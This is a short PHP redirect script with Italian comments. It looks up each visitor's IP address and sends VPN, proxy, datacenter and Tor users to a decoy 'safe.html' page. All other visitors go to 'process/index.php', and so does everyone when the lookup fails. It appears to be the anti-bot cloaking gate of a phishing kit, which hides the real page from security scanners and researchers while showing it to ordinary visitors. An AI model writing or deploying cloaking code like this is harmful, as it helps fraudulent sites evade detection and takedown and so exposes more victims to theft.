<?php

$bot_redirect = "safe.html";
$user_redirect = " process/index.php";

function getRealIP() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'];
}

$ip = getRealIP();

// cURL (più veloce e controllabile)
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.ipapi.is/?q=$ip");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 1); // max 1 secondo

$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);

// Se API fallisce → lascia passare (veloce)
if (!$data) {
    header("Location: $user_redirect");
    exit();
}

if (
    ($data['is_vpn'] ?? false) ||
    ($data['is_proxy'] ?? false) ||
    ($data['is_datacenter'] ?? false) ||
    ($data['is_tor'] ?? false)
) {
    header("Location: $bot_redirect");
    exit();
}

header("Location: $user_redirect");
exit();

?>